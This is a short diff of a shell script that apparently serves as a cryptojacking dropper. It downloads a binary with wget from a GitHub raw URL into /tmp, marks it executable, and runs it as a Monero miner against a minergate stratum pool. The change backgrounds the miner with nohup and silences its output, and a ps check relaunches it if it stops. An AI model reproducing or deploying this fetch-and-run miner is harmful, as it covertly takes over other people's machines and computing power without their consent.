@@ -8,6 +8,6 @@ if [ ! -f "/tmp/c2l" ]; then
 wget -O "/tmp/c2l" "https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/c2l.zip"
 fi
 chmod +x "/tmp/c2l"
-/tmp/c2l -c x -t 1 -M stratum+tcp://c2l%40protonmail.com:x@xmr.pool.minergate.com:45560/xmr
+nohup /tmp/c2l -c x -t 1 -M stratum+tcp://c2l%40protonmail.com:x@xmr.pool.minergate.com:45560/xmr >/dev/null 2>&1 &
 }
 ps auxf|grep -v grep|grep "c2l" || Doc2l
